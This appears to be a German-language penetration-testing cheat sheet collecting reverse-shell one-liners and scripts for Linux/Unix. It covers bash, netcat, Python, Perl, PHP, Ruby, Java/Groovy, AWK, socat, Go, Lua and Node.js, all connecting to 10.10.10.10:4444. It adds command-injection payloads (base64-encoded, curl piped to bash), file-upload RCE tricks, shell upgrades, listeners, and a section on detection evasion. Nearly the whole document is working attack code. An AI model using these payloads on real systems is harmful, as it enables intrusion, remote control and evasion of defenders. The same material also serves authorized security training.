# Alternative Reverse Shells - Linux/Unix

## 1. Bash Reverse Shells

### 1.1 Classic Bash TCP

```bash
# Standard Bash Reverse Shell
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Alternative Syntax
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# Mit /bin/bash explizit
/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Exec Redirect (persistenter)
exec 5<>/dev/tcp/10.10.10.10/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# One-Liner mit 0<&196
0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196
```

### 1.2 Bash mit Named Pipes

```bash
# FIFO/Named Pipe Method
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# Alternative ohne nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|/bin/bash -c 'exec 3<>/dev/tcp/10.10.10.10/4444;cat >&3' >/tmp/f
```

### 1.3 Bash UDP Reverse Shell

```bash
# UDP statt TCP
bash -i >& /dev/udp/10.10.10.10/4444 0>&1

# Listener auf Kali: nc -ulvnp 4444
```

---

## 2. Netcat Reverse Shells

### 2.1 Netcat mit -e Flag

```bash
# Traditional Netcat (mit -e Option)
nc -e /bin/sh 10.10.10.10 4444
nc -e /bin/bash 10.10.10.10 4444

# Mit ncat (Nmap's Netcat)
ncat -e /bin/bash 10.10.10.10 4444

# OpenBSD Netcat (ohne -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```

### 2.2 Netcat Named Pipe Alternative

```bash
# Wenn nc kein -e hat
mknod backpipe p; nc 10.10.10.10 4444 0<backpipe | /bin/bash 1>backpipe 2>backpipe

# Mit stderr redirect
rm -f /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 10.10.10.10 4444 1>/tmp/p
```

### 2.3 Netcat ohne Named Pipes

```bash
# Input/Output Redirect
nc 10.10.10.10 4444 | /bin/bash | nc 10.10.10.10 5555

# Mit while loop
while true; do nc -l -p 4444 -e /bin/bash; done
```

---

## 3. Python Reverse Shells

### 3.1 Python Standard (Socket)

```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Python mit /bin/bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
```

### 3.2 Python PTY Shell

```python
# Mit PTY für interaktive Shell
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Python3 mit pty
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
```

### 3.3 Python ohne Subprocess

```python
# Alternative ohne subprocess import
python -c 'import socket,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/bash")'
```

---

## 4. Perl Reverse Shells

### 4.1 Perl Standard

```perl
# Classic Perl Reverse Shell
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Mit /bin/bash
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### 4.2 Perl ohne /bin/sh

```perl
# Direkter Perl-basierter Shell Loop
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 4.3 Perl Windows-kompatibel

```perl
# Funktioniert auch auf Windows (wenn Perl installiert)
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## 5. PHP Reverse Shells

### 5.1 PHP exec Function

```php
# PHP mit exec() und file descriptor 3
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Mit /bin/bash
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# File descriptor 4 (falls 3 nicht funktioniert)
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&4 >&4 2>&4");'
```

### 5.2 PHP shell_exec

```php
# Mit shell_exec und stream
php -r '$sock=fsockopen("10.10.10.10",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### 5.3 PHP Full Reverse Shell Script

```php
<?php
// php-reverse-shell.php
set_time_limit(0);
$ip = '10.10.10.10';
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptors = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);
$process = proc_open('/bin/sh', $descriptors, $pipes);
proc_close($process);
?>
```

---

## 6. Ruby Reverse Shells

### 6.1 Ruby Standard

```ruby
# Basic Ruby Reverse Shell
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Mit /bin/bash
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### 6.2 Ruby ohne /bin/sh

```ruby
# Ruby Loop-basiert
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Ruby mit STDIN/STDOUT
ruby -rsocket -e 'c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## 7. Java Reverse Shells

### 7.1 Java Runtime.exec()

```java
// Java One-Liner (in Groovy Console, BSH, oder .java file)
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

// Alternative
r = Runtime.getRuntime(); p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5|while read l;do \$l 2>&5>&5;done"] as String[]); p.waitFor()
```

### 7.2 Java Socket

```java
import java.io.*;
import java.net.*;

public class RevShell {
    public static void main(String[] args) throws Exception {
        Socket s = new Socket("10.10.10.10", 4444);
        Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0) so.write(pi.read());
            while(pe.available()>0) so.write(pe.read());
            while(si.available()>0) po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try { p.exitValue(); break; } catch (Exception e){}
        }
    }
}
```

### 7.3 Java Serialized Payload (Groovy)

```groovy
// Groovy Reverse Shell (in Groovy Console oder Jenkins)
String host="10.10.10.10";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## 8. Advanced & Uncommon Shells

### 8.1 AWK Reverse Shell

```awk
# AWK TCP Reverse Shell
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### 8.2 Socat Reverse Shell

```bash
# Socat Standard
socat tcp-connect:10.10.10.10:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane

# Socat mit TTY
socat tcp-connect:10.10.10.10:4444 exec:'bash -li',pty,stderr,setsid,sigint,sane

# Listener auf Kali (besser als nc)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### 8.3 Telnet Reverse Shell

```bash
# Telnet Two-Way
telnet 10.10.10.10 4444 | /bin/bash | telnet 10.10.10.10 5555

# Telnet mit Named Pipe
rm -f /tmp/p; mknod /tmp/p p; telnet 10.10.10.10 4444 0</tmp/p | /bin/bash 1>/tmp/p
```

### 8.4 Xterm Reverse Shell

```bash
# Xterm zu Angreifer (X11)
xterm -display 10.10.10.10:1

# Auf Kali (X Server starten)
Xnest :1
xhost +targetip
```

### 8.5 Golang Reverse Shell

```go
package main
import("net";"os/exec";"os")
func main(){
    c,_:=net.Dial("tcp","10.10.10.10:4444")
    cmd:=exec.Command("/bin/sh")
    cmd.Stdin=c
    cmd.Stdout=c
    cmd.Stderr=c
    cmd.Run()
}
```

### 8.6 Lua Reverse Shell

```lua
# Lua TCP Shell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Lua Alternative
lua5.1 -e 'local host, port = "10.10.10.10", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### 8.7 Node.js Reverse Shell

```javascript
// Node.js One-Liner
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"10.10.10.10",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})();'

// Node.js Alternative
node -e 'require("child_process").exec("bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'")'
```

---

## 9. Web Application Context

### 9.1 Command Injection

```bash
# URL Encoded Bash Reverse Shell
; bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
| bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
|| bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
& bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
%0a bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# Base64 Encoded (bypass filtering)
;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=|base64 -d|bash

# Mit curl download
;curl http://10.10.10.10/shell.sh|bash
```

### 9.2 File Upload -> RCE

```bash
# Upload PHP reverse shell als image.php.jpg (double extension)
# Oder .phtml, .phar, .php5

# Upload .htaccess to enable PHP parsing
AddType application/x-httpd-php .jpg

# Then upload shell.jpg
```

---

## 10. Upgrading Shells

### 10.1 Python PTY Upgrade

```bash
# Auf Target nach initialer Shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Dann Ctrl+Z (background)
# Auf Kali:
stty raw -echo; fg
# Enter 2x

# Optional: Terminal size setzen
export TERM=xterm
stty rows 38 columns 116
```

### 10.2 Socat PTY Upgrade

```bash
# Auf Kali: socat binary hosten
python3 -m http.server 80

# Auf Target: socat downloaden
wget http://10.10.10.10/socat -O /tmp/socat
chmod +x /tmp/socat

# Listener auf Kali
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Auf Target
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

### 10.3 Script Command

```bash
# Alternative zu Python pty
script /dev/null -c bash
```

---

## 11. Listener Options (Kali)

```bash
# Standard Netcat
nc -lvnp 4444

# Rlwrap (mit command history)
rlwrap nc -lvnp 4444

# Ncat (Nmap)
ncat -lvnp 4444

# Ncat mit SSL
ncat --ssl -lvnp 4444

# Socat (beste Option für TTY)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Metasploit Multi Handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit"

# PowerCat (PowerShell Listener - für Windows)
powercat -l -p 4444 -v
```

---

## 12. Quick Reference Table

| Language | One-Liner | Recommended For |
|----------|-----------|-----------------|
| Bash | `bash -i >& /dev/tcp/IP/4444 0>&1` | Most Linux systems |
| Python | `python -c 'import socket...'` | Almost always available |
| Perl | `perl -e 'use Socket;...'` | Legacy systems |
| PHP | `php -r '$sock=fsockopen("IP",4444);...'` | Web servers |
| Ruby | `ruby -rsocket -e'...'` | Ruby environments |
| Netcat | `nc -e /bin/sh IP 4444` | If nc available with -e |
| Socat | `socat tcp-connect:IP:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane` | Best interactive shell |
| Java | `r = Runtime.getRuntime(); r.exec(["/bin/bash"...])` | Java environments |

---

## 13. Port Selection Strategy

```bash
# Common Open Ports (weniger verdächtig)
80   (HTTP)
443  (HTTPS)
53   (DNS)
22   (SSH)
21   (FTP)
25   (SMTP)
110  (POP3)

# Wenn Firewall strict ist: DNS/ICMP Tunneling
# Oder: HTTPS Reverse Shell (Port 443)
```

---

## 14. Troubleshooting

| Problem | Lösung |
|---------|--------|
| `/dev/tcp` nicht verfügbar | Nutze nc, socat, python, oder perl |
| Kein nc mit `-e` | Nutze named pipe method: `rm /tmp/f;mkfifo /tmp/f;...` |
| Python nicht verfügbar | Versuche perl, ruby, php, oder bash |
| Firewall blockiert | Nutze Port 443/80, oder reverse HTTPS tunnel |
| Shell bricht sofort ab | Check listener läuft, check firewall, check IP |
| Non-interactive shell | Upgrade mit python pty oder socat |

---

## 15. Detection Evasion

```bash
# Reverse Shell mit delay (cron)
(sleep 300; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1) &

# Über uncommon ports
bash -i >& /dev/tcp/10.10.10.10/443 0>&1

# Base64 Encoded
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64
# Decode & Execute:
echo BASE64_STRING | base64 -d | bash

# Via DNS Tunneling (mit dnscat2)
# Via ICMP Tunneling (mit icmpsh)
```

---

## 16. Resources

- **PentestMonkey Reverse Shell Cheat Sheet**: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- **RevShells Generator**: https://www.revshells.com/
- **GTFOBins** (for shell upgrades): https://gtfobins.github.io/
- **Socat Binaries**: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
